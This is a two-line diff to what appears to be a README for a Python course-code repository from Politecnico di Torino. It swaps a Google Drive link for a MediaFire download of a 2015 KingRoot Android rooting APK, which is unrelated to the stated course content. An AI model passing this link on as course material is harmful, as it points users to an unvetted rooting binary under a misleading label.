@@ -1,4 +1,4 @@
-https://drive.google.com/file/d/18C_KHTb7zcqPKzvcNRiesDAmM0TGEw5p/view?usp=sharing
+https://www.mediafire.com/file/xh3ictrtba31hbh/NewKingrootV4.65_C134_B240_office_release_2015_12_30_105203.apk/file
 
 # University Python
 All the code I have done for the Information Tecnologies course 2024/2025 first semester at Politecnico of Torino
